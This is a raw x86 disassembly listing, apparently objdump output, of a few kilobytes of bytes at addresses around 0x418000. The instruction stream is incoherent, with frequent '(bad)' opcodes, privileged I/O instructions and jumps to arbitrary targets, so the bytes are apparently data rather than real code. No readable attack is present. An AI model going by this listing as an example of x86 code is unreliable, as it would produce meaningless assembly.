  41866c:	add    eax,0x6c1d6c11
  418671:	dec    ecx
  418672:	std    
  418673:	inc    ebx
  418674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418675:	xchg   DWORD PTR ds:0x56cc9279,ebx
  41867b:	xor    ah,bh
  41867d:	pop    ecx
  41867e:	or     DWORD PTR [ebx+ebx*2+0x283c20bd],ecx
  418685:	push   ss
  418686:	lods   eax,DWORD PTR ds:[esi]
  418687:	xlat   BYTE PTR ds:[ebx]
  418688:	int    0x81
  41868a:	into   
  41868b:	jp     0x41865c
  41868d:	(bad)  
  41868e:	sar    bh,0x3
  418691:	mov    eax,0x85aefa68
  418696:	dec    edx
  418697:	ja     0x41865c
  418699:	push   ecx
  41869a:	imul   esp,DWORD PTR [edx],0x50
  41869d:	out    0xb9,al
  41869f:	hlt    
  4186a0:	jns    0x418678
  4186a2:	mov    ch,0x9e
  4186a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186a5:	xchg   esi,eax
  4186a6:	mov    DWORD PTR [ecx],eax
  4186a8:	imul   ebp,eax,0x39
  4186ab:	lahf   
  4186ac:	cmc    
  4186ad:	clc    
  4186ae:	aad    0x4a
  4186b0:	arpl   WORD PTR [ecx],sp
  4186b2:	lods   al,BYTE PTR ds:[esi]
  4186b3:	and    al,0xc9
  4186b5:	add    eax,0x219064f5
  4186ba:	mov    bl,0xe3
  4186bc:	add    esp,ebp
  4186be:	retf   
  4186bf:	cmp    BYTE PTR [ebx-0x55],bl
  4186c2:	inc    eax
  4186c3:	nop
  4186c4:	ror    ebp,1
  4186c6:	fistp  DWORD PTR [edx+eiz*1+0x27d2610d]
  4186cd:	enter  0x3078,0x42
  4186d1:	in     eax,0x3b
  4186d3:	mov    ebp,0xa9e5105c
  4186d8:	popf   
  4186d9:	mov    ecx,0xcc782f03
  4186de:	sub    DWORD PTR [edi+0x54176a2b],ebx
  4186e4:	cmp    al,0x30
  4186e6:	push   es
  4186e7:	sub    DWORD PTR [ecx],ecx
  4186e9:	hlt    
  4186ea:	fsub   QWORD PTR [ecx+edi*8-0x39]
  4186ee:	stos   DWORD PTR es:[edi],eax
  4186ef:	nop
  4186f0:	repnz pop edx
  4186f2:	push   edi
  4186f3:	jmp    DWORD PTR [esi-0x4e774681]
  4186f9:	mov    ebx,0x8044d7df
  4186fe:	mov    dh,0x7b
  418700:	sti    
  418701:	xchg   ebp,eax
  418702:	shl    BYTE PTR [esi+ecx*1+0x39],cl
  418706:	fadd   QWORD PTR [ebx+edx*1+0x24]
  41870a:	dec    edi
  41870b:	mov    al,bh
  41870d:	hlt    
  41870e:	fs jns 0x418764
  418711:	fnstcw WORD PTR [edx-0x5]
  418714:	dec    edi
  418715:	dec    ebx
  418716:	push   esp
  418717:	dec    ebx
  418718:	sar    BYTE PTR [edi-0x68],1
  41871b:	in     al,dx
  41871c:	mov    al,ds:0xd2388445
  418721:	dec    ebp
  418722:	sbb    BYTE PTR [esi*4-0x349299c4],al
  418729:	sub    DWORD PTR [ebp+0x667963b6],ebp
  41872f:	pop    edi
  418730:	imul   esp,DWORD PTR ds:0xdfb4766c,0xa84423ca
  41873a:	pop    ss
  41873b:	jge    0x41878c
  41873d:	pusha  
  41873e:	sub    esi,DWORD PTR [eax+0x24]
  418741:	fiadd  WORD PTR [eax]
  418743:	in     al,0x26
  418745:	and    al,0x1e
  418747:	sbb    esi,edi
  418749:	push   ds
  41874a:	(bad)  
  41874b:	xor    al,0x16
  41874d:	adc    al,0x73
  41874f:	jno    0x41873f
  418751:	mov    dh,0x8a
  418753:	fsubr  st(3),st
  418755:	fbstp  TBYTE PTR [edi-0x4ef60520]
  41875b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41875c:	sub    BYTE PTR [ebp-0x1f],al
  41875f:	mov    ds:0xece194d8,al
  418764:	adc    bh,BYTE PTR [eax-0xf90a008]
  41876a:	jp     0x418704
  41876c:	repz mov eax,0xf100a9e3
  418772:	xchg   esp,eax
  418773:	sub    edx,DWORD PTR [ecx]
  418775:	mov    ebx,0x6501017f
  41877a:	jecxz  0x41873f
  41877c:	ins    DWORD PTR es:[edi],dx
  41877d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41877e:	enter  0xaac8,0x57
  418782:	cld    
  418783:	cmp    edx,DWORD PTR [edx+ecx*2+0x7b]
  418787:	dec    eax
  418788:	xchg   ebx,eax
  418789:	dec    eax
  41878a:	xchg   ebx,eax
  41878b:	xchg   edi,eax
  41878c:	adc    BYTE PTR [edx+0x62a5e0ce],0x69
  418793:	nop
  418794:	inc    edx
  418795:	gs lahf 
  418797:	adc    BYTE PTR [edi-0x15],ah
  41879a:	jl     0x418804
  41879c:	jo     0x4187fa
  41879e:	cmp    BYTE PTR [esi+0x79571bfe],bh
  4187a4:	mov    ebp,0x63b886cd
  4187a9:	dec    ebp
  4187aa:	sahf   
  4187ab:	jle    0x418779
  4187ad:	sti    
  4187ae:	and    DWORD PTR [edx+0x3d88ea9b],edi
  4187b4:	fild   WORD PTR [eax-0x28]
  4187b7:	mov    BYTE PTR [eax],bl
  4187b9:	daa    
  4187ba:	mov    ecx,0xc5211c04
  4187bf:	add    al,0xe6
  4187c1:	addr16 cdq 
  4187c3:	dec    eax
  4187c4:	push   ebx
  4187c5:	shr    BYTE PTR [edi],1
  4187c7:	fdiv   QWORD PTR [ebx]
  4187c9:	mov    ch,0xa6
  4187cb:	inc    esi
  4187cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187cd:	inc    edi
  4187ce:	adc    al,0x9
  4187d0:	jne    0x4187df
  4187d2:	sub    BYTE PTR [ecx-0x4d],ah
  4187d5:	cmp    al,0x5a
  4187d7:	retf   0x3a18
  4187da:	mov    bl,0x80
  4187dc:	mov    al,0xdb
  4187de:	jle    0x418829
  4187e0:	nop
  4187e1:	stos   BYTE PTR es:[edi],al
  4187e2:	or     al,dh
  4187e4:	js     0x41882b
  4187e6:	lock sbb DWORD PTR [esi-0x59951463],ecx
  4187ed:	sbb    BYTE PTR [edi+0x27b8b953],bl
  4187f3:	push   ecx
  4187f4:	mov    ebx,0xc133abf4
  4187f9:	(bad)  
  4187fa:	jle    0x4187a6
  4187fc:	push   edi
  4187fd:	xor    DWORD PTR [eax+0x3a],edx
  418800:	fisttp QWORD PTR ds:0x6135b754
  418806:	cmc    
  418807:	imul   ebp,DWORD PTR [eax+0x2544935a],0x50
  41880e:	dec    ecx
  41880f:	add    BYTE PTR [ecx+0x11],ch
  418812:	(bad)  
  418813:	mov    esp,0x5849489a
  418818:	inc    ecx
  418819:	addr16 or eax,0x661a2a39
  41881f:	(bad)  
  418821:	inc    ecx
  418822:	mov    bl,0xe6
  418824:	mov    edi,0x49962eae
  418829:	icebp  
  41882a:	or     ch,BYTE PTR [edx+0xd2f3cdc]
  418830:	add    bh,dl
  418832:	fld    TBYTE PTR [eax]
  418834:	addr16 mov edx,0xd151263d
  41883a:	in     al,0x9b
  41883c:	aaa    
  41883d:	(bad)  [edx]
  41883f:	adc    cl,dh
  418841:	dec    BYTE PTR [ebx]
  418843:	std    
  418844:	cld    
  418845:	sbb    eax,0x8aadf68a
  41884a:	cmp    ebx,DWORD PTR [esi+0x133bb309]
  418850:	aas    
  418851:	and    DWORD PTR [eax],ebx
  418853:	dec    ebx
  418854:	lods   eax,DWORD PTR ds:[esi]
  418855:	int3   
  418856:	xchg   edx,eax
  418857:	pop    ss
  418858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418859:	aas    
  41885a:	dec    ecx
  41885b:	stc    
  41885c:	and    eax,0x34f918a5
  418861:	add    eax,0xe98eabe6
  418866:	es inc esi
  418868:	je     0x4188c4
  41886a:	push   ecx
  41886b:	shr    BYTE PTR [ecx],1
  41886d:	pop    ss
  41886e:	pop    esi
  41886f:	sbb    DWORD PTR [esi+0x72],0x6917c21
  418876:	mov    esp,0x2d328839
  41887b:	pop    es
  41887c:	xor    BYTE PTR [esi-0x3fafabb],bl
  418882:	cli    
  418883:	mov    ch,0xb5
  418885:	mov    ss,WORD PTR [eax-0x47]
  418888:	cmp    cl,0xed
  41888b:	xchg   BYTE PTR [ecx],dh
  41888d:	xchg   edi,eax
  41888e:	stos   BYTE PTR es:[edi],al
  41888f:	mov    esi,0x6c2627f4
  418894:	sub    DWORD PTR [edx+0x19e095e8],0xffffffbd
  41889b:	call   0x9123:0xcc6aec8b
  4188a2:	cmp    BYTE PTR ds:0x13e7414,bl
  4188a8:	push   ss
  4188a9:	cld    
  4188aa:	xchg   ebx,eax
  4188ab:	lods   eax,DWORD PTR ds:[esi]
  4188ac:	dec    edx
  4188ad:	pusha  
  4188ae:	in     al,0xa6
  4188b0:	push   ecx
  4188b1:	or     eax,DWORD PTR ds:0x7197338a
  4188b7:	shl    BYTE PTR [ecx+0x5351767b],1
  4188bd:	(bad)  
  4188be:	aaa    
  4188bf:	xchg   DWORD PTR [eax-0x57],esi
  4188c2:	cmp    BYTE PTR [ebx+0x7d0f576b],bh
  4188c8:	jp     0x4188cd
  4188ca:	fbstp  TBYTE PTR [edi+esi*1]
  4188cd:	mov    bl,0x56
  4188cf:	pop    ebp
  4188d0:	mov    esi,0x41242cee
  4188d5:	cmp    eax,0x48ad789b
  4188da:	dec    esi
  4188db:	jnp    0x418930
  4188dd:	icebp  
  4188de:	shl    dh,0x5d
  4188e1:	out    dx,eax
  4188e2:	scas   eax,DWORD PTR es:[edi]
  4188e3:	cld    
  4188e4:	(bad)  
  4188e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188e6:	iret   
  4188e7:	xchg   ebx,esp
  4188e9:	dec    eax
  4188ea:	and    bh,bl
  4188ec:	(bad)  
  4188ed:	fisubr DWORD PTR [edi-0x18]
  4188f0:	test   DWORD PTR [ebp+0xb5ba909],ebp
  4188f6:	loop   0x4188bf
  4188f8:	aam    0x8b
  4188fa:	in     al,0x83
  4188fc:	sub    edi,DWORD PTR [eax+edx*8+0x124108ee]
  418903:	mov    eax,0x3335009a
  418908:	push   ebp
  418909:	add    DWORD PTR [ebx-0x73],0x53
  41890d:	nop
  41890e:	pop    edx
  41890f:	outs   dx,DWORD PTR ds:[esi]
  418910:	adc    eax,0x3d866c7
  418915:	retf   
  418916:	dec    ebx
  418917:	pop    ds
  418918:	dec    ebp
  418919:	push   eax
  41891a:	fsubr  QWORD PTR [ebp-0x1f6b1da7]
  418920:	xchg   edi,eax
  418921:	sbb    BYTE PTR [ebx-0x6393cdcd],al
  418927:	out    0x39,al
  418929:	xchg   edx,eax
  41892a:	test   eax,0x510f01a5
  41892f:	mov    edx,0xb5a5be8
  418934:	outs   dx,BYTE PTR ds:[esi]
  418935:	push   0x10feed5a
  41893a:	or     al,0x38
  41893c:	(bad)
  41893f:	gs (bad) 
  418941:	fldenv [eax+0x327ccb29]
  418947:	sub    BYTE PTR [esi-0x14],bl
  41894a:	repnz sbb cl,BYTE PTR ds:0xd5fcc949
  418951:	retf   0x239b
  418954:	mov    ch,0x14
  418956:	inc    eax
  418957:	or     ebp,DWORD PTR [ecx]
  418959:	mov    al,ds:0xd45bafed
  41895e:	jl     0x4189d8
  418960:	push   cs
  418961:	lds    ecx,FWORD PTR [edi+0x5c257a58]
  418967:	rcr    BYTE PTR [esi],cl
  418969:	cli    
  41896a:	mov    edi,0x40321163
  41896f:	adc    bl,dl
  418971:	mov    ebx,0xe82cd799
  418976:	mov    dh,0xc8
  418978:	popf   
  418979:	add    eax,0xcaaab77e
  41897e:	mov    eax,ds:0x500b4d56
  418983:	adc    BYTE PTR [esi-0x20],al
  418986:	push   cs
  418987:	push   0xffffffe8
  418989:	loope  0x4189fe
  41898b:	fcmovnu st,st(3)
  41898d:	ficomp WORD PTR [edi+eax*1]
  418990:	sahf   
  418991:	cmp    BYTE PTR [edx],dl
  418993:	cld    
  418994:	and    al,0x14
  418996:	cmp    DWORD PTR [ebp-0x36],ebx
  418999:	(bad)  
  41899a:	mov    edi,0x9c586475
  41899f:	push   eax
  4189a0:	add    ch,ch
  4189a2:	daa    
  4189a3:	sbb    BYTE PTR [ebx],dh
  4189a5:	in     eax,0x1b
  4189a7:	jmp    0x808f:0xb604aa18
  4189ae:	mov    ch,0x34
  4189b0:	dec    eax
  4189b1:	jmp    0x418a1f
  4189b3:	(bad)
  4189b7:	retf   0xae62
  4189ba:	retf   0x2f9d
  4189bd:	aas    
  4189be:	xchg   esp,eax
  4189bf:	lods   al,BYTE PTR ds:[esi]
  4189c0:	leave  
  4189c1:	neg    BYTE PTR [ecx]
  4189c3:	mov    edi,ss
  4189c5:	sub    ebx,DWORD PTR [eax]
  4189c7:	test   edx,ebp
  4189c9:	dec    ebx
  4189ca:	aaa    
  4189cb:	inc    eax
  4189cc:	out    0xb4,eax
  4189ce:	inc    edi
  4189cf:	sub    eax,0x14250dfd
  4189d4:	je     0x418a2e
  4189d6:	stc    
  4189d7:	mov    es,eax
  4189d9:	lahf   
  4189da:	daa    
  4189db:	fcomp  st(5)
  4189dd:	fild   QWORD PTR [ecx]
  4189df:	pop    edx
  4189e0:	adc    bl,BYTE PTR [edi-0x5ee0f0e]
  4189e6:	inc    eax
  4189e7:	add    edi,DWORD PTR [ebp+0x9ce5cc3]
  4189ed:	repz and ebp,DWORD PTR [edi-0x19]
  4189f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189f2:	mov    dh,0x39
  4189f4:	arpl   WORD PTR [eax+0x6102c62],di
  4189fa:	pop    esp
  4189fb:	mov    eax,0x4f0653e6
  418a00:	adc    dl,ah
  418a02:	cdq    
  418a03:	mov    eax,0x97e01c4a
  418a08:	dec    edi
  418a09:	or     BYTE PTR [edx],dl
  418a0b:	out    dx,al
  418a0c:	clc    
  418a0d:	repz xchg ebx,eax
  418a0f:	sahf   
  418a10:	(bad)  
  418a11:	mov    ah,0x2e
  418a13:	repnz aam 0x26
  418a16:	jne    0x418a7c
  418a18:	sbb    al,0x88
  418a1a:	mov    ds:0x64b2610f,al
  418a1f:	dec    eax
  418a20:	imul   edi,DWORD PTR [eax],0x181777a5
  418a26:	cmp    BYTE PTR [eax+0x4c194ab6],0x31
  418a2d:	push   es
  418a2e:	stos   DWORD PTR es:[edi],eax
  418a2f:	leave  
  418a30:	jae    0x4189c8
  418a32:	imul   ebp,DWORD PTR [esp+esi*2+0x45],0x27
  418a37:	jle    0x418a91
  418a39:	popf   
  418a3a:	cmp    eax,0xbfc3ab5e
  418a3f:	aad    0xdf
  418a41:	ret    0xdf73
  418a44:	(bad)  
  418a45:	(bad)  
  418a46:	fidivr DWORD PTR [eax+eax*2]
  418a49:	push   edx
  418a4a:	lods   al,BYTE PTR ds:[esi]
  418a4b:	sbb    bh,cl
  418a4d:	cmp    eax,0x781b945
  418a52:	mov    bl,0x6c
  418a54:	sub    esp,ebx
  418a56:	aad    0x4a
  418a58:	pop    ds
  418a59:	and    al,0xe9
  418a5b:	add    eax,0x672db4d4
  418a60:	or     al,0x5d
  418a62:	xchg   edx,eax
  418a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a64:	retf   
  418a65:	mov    dh,0x31
  418a67:	xchg   esi,eax
  418a68:	mov    ecx,0xca5bdf4e
  418a6d:	icebp  
  418a6e:	in     al,dx
  418a6f:	adc    BYTE PTR ds:0xf138a6d5,cl
  418a75:	mov    ds:0x750257aa,al
  418a7a:	shl    ch,1
  418a7c:	mov    esp,0xb69fdf5
  418a81:	mov    ebp,0x3df67fe
  418a86:	dec    edi
  418a87:	sbb    ecx,DWORD PTR [ebp+0x1a]
  418a8a:	fstp   TBYTE PTR [edx+0x18d1cdef]
  418a90:	sbb    bl,BYTE PTR [ebp+0x1d]
  418a93:	dec    esp
  418a94:	cmp    DWORD PTR [edx+eiz*2-0x4c],esi
  418a98:	sbb    edx,esp
  418a9a:	stos   BYTE PTR es:[edi],al
  418a9b:	arpl   WORD PTR [edx-0x2],ax
  418a9e:	xchg   ebx,eax
  418a9f:	inc    esi
  418aa0:	mov    al,ds:0x90fb2491
  418aa5:	inc    esi
  418aa6:	inc    esi
  418aa7:	in     eax,dx
  418aa8:	ret    
  418aa9:	push   eax
  418aaa:	mov    bl,ch
  418aac:	sub    DWORD PTR [esi+eax*2],esp
  418aaf:	add    eax,DWORD PTR [esi+edx*2+0x33]
  418ab3:	push   fs
  418ab5:	jg     0x418a4c
  418ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab8:	mov    ch,0xd7
  418aba:	int3   
  418abb:	mov    eax,0x9a99c5ef
  418ac0:	pop    ebp
  418ac1:	xchg   esp,eax
  418ac2:	pusha  
  418ac3:	push   ecx
  418ac4:	(bad)  
  418ac5:	cmp    al,0xab
  418ac7:	pop    ss
  418ac8:	or     ebp,esp
  418aca:	jmp    0xa6f7f5cb
  418acf:	inc    ebp
  418ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ad1:	mov    eax,ds:0x395f9f7a
  418ad6:	jmp    DWORD PTR [ebp+ecx*1+0x26]
  418ada:	hlt    
  418adb:	test   al,0x4c
  418add:	mul    DWORD PTR [ebx-0x2e]
  418ae0:	push   0x1dd10eba
  418ae5:	pushf  
  418ae6:	jmp    0x8aeae7bc
  418aeb:	and    BYTE PTR [ecx-0x19],dh
  418aee:	adc    ebx,eax
  418af0:	test   BYTE PTR [eax+0x6bf13395],ch
  418af6:	xchg   ecx,eax
  418af7:	mov    DWORD PTR [esi-0x50],ebp
  418afa:	jnp    0x418af1
  418afc:	clc    
  418afd:	(bad)  
  418afe:	xor    DWORD PTR [eax],edx
  418b00:	lods   al,BYTE PTR ds:[esi]
  418b01:	cwde   
  418b02:	iret   
  418b03:	int3   
  418b04:	loope  0x418a9c
  418b06:	stc    
  418b07:	syscall 
  418b09:	dec    esi
  418b0a:	loopne 0x418a9b
  418b0c:	test   eax,0x5088eacc
  418b11:	int3   
  418b12:	sti    
  418b13:	adc    eax,0x45c1f669
  418b18:	mov    esi,0x73022437
  418b1d:	les    ebx,FWORD PTR [esi+0x6145db2e]
  418b23:	fcompp 
  418b25:	mov    WORD PTR [ebx-0x19511407],fs
  418b2b:	mov    edx,0x8f70a1f
  418b30:	jge    0x418b13
  418b32:	cmp    al,BYTE PTR [ebx-0x18]
  418b35:	fcmovne st,st(3)
  418b37:	ficomp DWORD PTR [edx-0x1c7921c7]
  418b3d:	mov    ebx,DWORD PTR [ebx+esi*4-0x6f]
  418b41:	jg     0x418af4
  418b43:	outs   dx,DWORD PTR ds:[esi]
  418b44:	mov    ebx,DWORD PTR [esi+0x5e3cf44a]
  418b4a:	xchg   ecx,eax
  418b4b:	js     0x418ad5
  418b4d:	push   cs
  418b4e:	mov    esp,cs
  418b50:	adc    DWORD PTR [edi+0x61],ecx
  418b53:	rcr    DWORD PTR [esi+0xacfeb14],1
  418b59:	enter  0x1545,0x35
  418b5d:	das    
  418b5e:	pop    es
  418b5f:	ss cwde 
  418b61:	cmp    al,0xd
  418b63:	mov    ch,bl
  418b65:	out    0x94,al
  418b67:	xlat   BYTE PTR ds:[ebx]
  418b68:	push   ds
  418b69:	mov    ds:0x3cd998a8,eax
  418b6e:	mov    ch,0x20
  418b70:	add    al,0xc
  418b72:	mov    dl,0xc2
  418b74:	add    DWORD PTR [edx-0x18442bb3],esp
  418b7a:	ror    DWORD PTR [ebx+0x64],0x17
  418b7e:	or     eax,0x426393cf
  418b83:	fild   QWORD PTR [ecx]
  418b85:	or     al,0xac
  418b87:	mov    cl,BYTE PTR [edi]
  418b89:	jge    0x418bf3
  418b8b:	push   eax
  418b8c:	or     BYTE PTR [ebp+0x25],dh
  418b8f:	gs or  al,0x8f
  418b92:	leave  
  418b93:	cmp    al,al
  418b95:	push   cs
  418b96:	and    al,0x50
  418b98:	dec    ebp
  418b99:	xchg   esp,eax
  418b9a:	imul   edx,esp,0x6dde07d0
  418ba0:	add    DWORD PTR [ebx],esp
  418ba2:	sbb    dh,dl
  418ba4:	cmp    DWORD PTR [eax+edx*2-0x42ffd1d4],esi
  418bab:	and    ebp,DWORD PTR [ecx+ebx*2+0x36]
  418baf:	clc    
  418bb0:	add    ebp,DWORD PTR [edi]
  418bb2:	clc    
  418bb3:	cvttps2pi mm5,QWORD PTR [ecx]
  418bb6:	adc    al,BYTE PTR [ebx-0xc9a99a5]
  418bbc:	lock mov al,ds:0xec2cf7a7
  418bc2:	call   0x1ae7090e
  418bc7:	ret    0x8aae
  418bca:	pop    ebp
  418bcb:	xor    cl,BYTE PTR [edi-0x2ff47c55]
  418bd1:	jle    0x418bda
  418bd3:	jle    0x418bd4
  418bd5:	and    dl,dh
  418bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bd8:	std    
  418bd9:	add    esp,esp
  418bdb:	ds mov ecx,0xc66d1ebf
  418be1:	mov    dh,BYTE PTR [eax]
  418be3:	add    eax,DWORD PTR [ecx-0x3a]
  418be6:	ins    BYTE PTR es:[edi],dx
  418be7:	lods   al,BYTE PTR ds:[esi]
  418be8:	rol    ecx,cl
  418bea:	std    
  418beb:	push   cs
  418bec:	adc    DWORD PTR [ebx-0x71],edx
  418bef:	xchg   ebx,eax
  418bf0:	push   edi
  418bf1:	shl    BYTE PTR [esi+0x76],1
  418bf4:	add    al,0x5c
  418bf6:	lods   eax,DWORD PTR ds:[esi]
  418bf7:	out    0x4,al
  418bf9:	add    edi,DWORD PTR [ebx]
  418bfb:	test   DWORD PTR [esp+esi*2+0x2c],0x7dbe4a89
  418c03:	jo     0x418bf8
  418c05:	inc    edx
  418c06:	jmp    0x7b3a7605
  418c0b:	lea    ebp,[ebx+0x29]
  418c0e:	bound  esi,QWORD PTR [ebx]
  418c10:	add    dl,BYTE PTR [esi-0x7f]
  418c13:	je     0x418c67
  418c15:	mov    bl,0xa2
  418c17:	mov    bh,0xf2
  418c19:	imul   edi,DWORD PTR [edx+0x55e17a41],0x68
  418c20:	add    DWORD PTR [esi],ecx
  418c22:	in     ax,0xf9
  418c25:	mov    al,0x54
  418c27:	inc    ecx
  418c28:	scas   al,BYTE PTR es:[edi]
  418c29:	cmp    ebx,DWORD PTR [edx+0x454d29b4]
  418c2f:	dec    ebp
  418c30:	outs   dx,BYTE PTR ds:[esi]
  418c31:	cmc    
  418c32:	dec    ebx
  418c33:	jle    0x418c7a
  418c35:	inc    ecx
  418c36:	bound  ecx,QWORD PTR [ebx+0x54913647]
  418c3c:	sti    
  418c3d:	outs   dx,BYTE PTR ds:[esi]
  418c3e:	push   ds
  418c3f:	push   es
  418c40:	dec    edx
  418c41:	jmp    0x418c4a
  418c43:	out    dx,eax
  418c44:	and    eax,0xf8017199
  418c49:	and    eax,DWORD PTR [esi]
  418c4b:	clc    
  418c4c:	xchg   DWORD PTR [edx-0x48],eax
  418c4f:	ins    DWORD PTR es:[edi],dx
  418c50:	lahf   
  418c51:	inc    ebx
  418c52:	jmp    0x418c13
  418c54:	fidivr DWORD PTR [edi]
  418c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c57:	or     al,0x63
  418c59:	ret    0x7ec9
  418c5c:	lds    edi,FWORD PTR [eax-0x3a]
  418c5f:	adc    eax,0xaa8e5ccb
  418c64:	dec    eax
  418c65:	push   cs
  418c66:	retf   
  418c67:	cmp    esp,0xad57d972
  418c6d:	mov    edx,0x646812cc
  418c72:	xlat   BYTE PTR ds:[ebx]
  418c73:	sbb    DWORD PTR [ebp-0x19],ebx
  418c76:	xchg   esi,eax
  418c77:	retf   0x1d6f
  418c7a:	test   eax,0x1970fb74
  418c7f:	pop    edi
  418c80:	mov    al,ds:0x5be562ad
  418c85:	les    ecx,FWORD PTR [ebp-0x19]
  418c88:	adc    BYTE PTR [esp+eiz*4+0x69],ch
  418c8c:	out    dx,al
  418c8d:	popf   
  418c8e:	in     eax,dx
  418c8f:	pop    edi
  418c90:	add    edi,ebp
  418c92:	xlat   BYTE PTR ds:[ebx]
  418c93:	mov    al,0x89
  418c95:	call   0xd3216927
  418c9a:	loope  0x418c2d
  418c9c:	imul   esi,ecx,0x57
  418c9f:	lock xchg DWORD PTR [ebx+0x456df09b],edx
  418ca6:	(bad)  
  418ca7:	imul   BYTE PTR [esi]
  418ca9:	outs   dx,BYTE PTR ds:[esi]
  418caa:	xor    DWORD PTR [edx],edi
  418cac:	js     0x418c57
  418cae:	mov    ?,edi
  418cb0:	push   edx
  418cb1:	adc    BYTE PTR fs:[ecx],bl
  418cb4:	sbb    BYTE PTR [eax],dh
  418cb6:	in     eax,0x35
  418cb8:	data16 (bad) 
  418cba:	lds    esp,FWORD PTR [ebp+eax*4-0x4e]
  418cbe:	push   bp
  418cc0:	adc    eax,0x42f7aa1
  418cc5:	adc    BYTE PTR [ebx-0x49],dh
  418cc8:	jle    0x418c4e
  418cca:	rol    BYTE PTR [ebp-0x48],1
  418ccd:	inc    eax
  418cce:	cld    
  418ccf:	aaa    
  418cd0:	sti    
  418cd1:	daa    
  418cd2:	xor    DWORD PTR [esi+0x71],eax
  418cd5:	scas   al,BYTE PTR es:[edi]
  418cd6:	mov    DWORD PTR [edx-0x32d634db],ecx
  418cdc:	aad    0x2f
  418cde:	icebp  
  418cdf:	mov    bh,0xed
  418ce1:	sti    
  418ce2:	pop    esi
  418ce3:	inc    eax
  418ce4:	xchg   edx,eax
  418ce5:	in     al,0x68
  418ce7:	test   al,0x23
  418ce9:	sbb    ebx,DWORD PTR [ecx+eax*4+0x599dd82f]
  418cf0:	test   al,0xcd
  418cf2:	fadd   DWORD PTR [eax]
  418cf4:	add    al,0xe4
  418cf6:	adc    BYTE PTR [ebx+0x1d],bl
  418cf9:	fwait
  418cfa:	iret   
  418cfb:	and    DWORD PTR [edx],0xb0900553
  418d01:	jmp    DWORD PTR [edi]
  418d03:	add    al,0x17
  418d05:	test   DWORD PTR [edi],edx
  418d07:	add    bh,BYTE PTR [edi-0x12]
  418d0a:	and    BYTE PTR [esi+0x2cd6cb13],al
  418d10:	mov    edx,0x5bc86aa5
  418d15:	add    cl,bh
  418d17:	hlt    
  418d18:	dec    edx
  418d19:	sub    ecx,DWORD PTR [edi+0x1bf641f2]
  418d1f:	pop    ss
  418d20:	jb     0x418caf
  418d22:	loopne 0x418ce2
  418d24:	jmp    0x418d07
  418d26:	push   esi
  418d27:	push   ss
  418d28:	enter  0xb247,0xc5
  418d2c:	xchg   BYTE PTR [ecx+0x3e8657c4],ah
  418d32:	in     eax,0x32
  418d34:	inc    edi
  418d35:	dec    esi
  418d36:	adc    eax,0x8424b837
  418d3b:	pop    ecx
  418d3c:	ss jo  0x418cf0
  418d3f:	repz sub BYTE PTR [ecx+ecx*4+0x56],ch
  418d44:	pop    esp
  418d45:	sub    ah,BYTE PTR [edi-0x57c18fcf]
  418d4b:	xchg   esp,eax
  418d4c:	push   edx
  418d4d:	adc    bl,BYTE PTR [esi]
  418d4f:	sub    bl,BYTE PTR [edx]
  418d51:	inc    eax
  418d52:	test   BYTE PTR [esi+eiz*2+0x52fe2d30],cl
  418d59:	push   esi
  418d5a:	fadd   st(7),st
  418d5c:	mov    ch,0x2a
  418d5e:	mov    ch,0x4b
  418d60:	fdivr  DWORD PTR [eax]
  418d62:	jno    0x418d53
  418d64:	test   al,0x6e
  418d66:	jl     0x418de2
  418d68:	leave  
  418d69:	icebp  
  418d6a:	or     dh,ch
  418d6c:	or     DWORD PTR [edx],edi
  418d6e:	mov    edi,0x6fabb409
  418d73:	lea    eax,[ecx+ebp*2-0x3c]
  418d77:	stos   DWORD PTR es:[edi],eax
  418d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d79:	in     al,dx
  418d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d7b:	ds in  eax,0x60
  418d7e:	xor    eax,0x7797c718
  418d83:	(bad)  [edi-0x6f2eaad5]
  418d89:	sbb    edx,DWORD PTR [ebx-0x3b7c783c]
  418d8f:	ficomp WORD PTR [esi+0x18]
  418d92:	sub    BYTE PTR [edx-0x39],bh
  418d95:	(bad)  
  418d96:	sahf   
  418d97:	cld    
  418d98:	mov    ds:0x36e6705c,al
  418d9d:	cmp    al,0x13
  418d9f:	cmp    DWORD PTR [ecx+0x70],eax
  418da2:	ins    BYTE PTR es:[edi],dx
  418da3:	nop
  418da4:	mov    esp,0x2e18bdf0
  418da9:	mov    BYTE PTR [edx-0xf],bh
  418dac:	push   esp
  418dad:	call   DWORD PTR [ecx+0x60340941]
  418db3:	repz in eax,dx
  418db5:	mov    esi,0xb8bbf9cc
  418dba:	sbb    DWORD PTR [eax+ebx*1+0x46],ebx
  418dbe:	mov    dh,0xa5
  418dc0:	lods   eax,DWORD PTR ds:[esi]
  418dc1:	xchg   esi,eax
  418dc2:	dec    edi
  418dc3:	dec    ebp
  418dc4:	fild   QWORD PTR [edx+0x4cfae554]
  418dca:	popf   
  418dcb:	and    al,0xfb
  418dcd:	mov    ah,0x51
  418dcf:	fs jae 0x418d7f
  418dd2:	std    
  418dd3:	outs   dx,DWORD PTR ds:[esi]
  418dd4:	adc    eax,DWORD PTR [ebp-0x7e275198]
  418dda:	mov    dh,0x52
  418ddc:	and    al,0xd0
  418dde:	lock ss in eax,dx
  418de1:	pop    ds
  418de2:	dec    esp
  418de3:	push   0x30
  418de5:	into   
  418de6:	sahf   
  418de7:	push   ecx
  418de8:	lahf   
  418de9:	cli    
  418dea:	fs pop ebx
  418dec:	int    0x7f
  418dee:	push   es
  418def:	cmp    dl,BYTE PTR [esi]
  418df1:	mov    DWORD PTR [edi+0x3bfedb65],edx
  418df7:	dec    esi
  418df8:	add    al,0x50
  418dfa:	push   edi
  418dfb:	add    DWORD PTR ds:0x4a7378b5,eax
